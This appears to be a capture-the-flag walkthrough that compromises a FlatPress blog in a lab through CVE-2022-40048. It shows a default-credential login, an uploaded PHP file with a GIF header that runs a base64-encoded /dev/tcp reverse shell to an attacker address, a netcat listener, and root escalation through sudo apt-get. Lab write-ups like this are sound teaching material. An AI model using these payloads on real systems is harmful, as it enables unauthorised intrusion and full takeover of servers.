____

# Enumeration

## Nmap

Initial step. Starting with an Nmap scan. We have 1 open port.

```
nmap -Pn --open 172.17.46.2
```


Open the address: http://[ip:port](ip:port) ( http://0.0.0.0:8089 )

We are presented with "**FlatPress**" weclome page.

## Flatpress

> is a lightweight, easy-to-set-up blogging engine.

# Exploitation

## Remote Code Execution

We find **"[CVE-2022-40048](https://nvd.nist.gov/vuln/detail/CVE-2022-40048)"** recorded for **Flatpress**.

The exploitation steps can be found here: https://github.com/flatpressblog/flatpress/issues/152

**Reference**: https://nvd.nist.gov/vuln/detail/CVE-2022-40048

#### Description: CVE-2022-40048

Flatpress v1.2.1 was discovered to contain a remote code execution (RCE) vulnerability in the Upload File function.

## POC

1. Open url : http://[ip:port](ip:port) ( http://0.0.0.0:8089 )
    
2. Click on login or go to this link: http://0.0.0.0:8089/login.php
    
3. Login with common default credential
    
    ```bash
    admin : password
    ```
    
4. We are logged in as administrator
    
5. Now click on "**uploader**"
    
6. Create a php file (ex: **exploit.php**) containing below contents
    
    ```php
     GIF89a;
    <?php
      system("echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjc1LzgwODEgMD4mMQo= | base64 -d | bash");
    ?>
    ```
    
    The base64 encoded form contains the reverse shell payload.
    
    ```bash
    echo "sh -i >& /dev/tcp/192.168.1.75/8081 0>&1" | base64 -w 0
    ```
    
7. Now listen netcat on your local machine
    
    ```bash
    rlwrap nc -lvnp 8081
    ```
    
8. Upload the epxloit file
    
9. Now click on "**Media Manager**"
    
10. Then click on the file "**exploit.php**"
    
11. We got reverse shell
    
12. checking sudo privileges
    

```r
$ sudo -l
Matching Defaults entries for www-data on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User www-data may run the following commands on debian:
    (ALL) NOPASSWD: /usr/bin/apt-get
```

13. Abuse sudo perms using

```r
$ sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
```
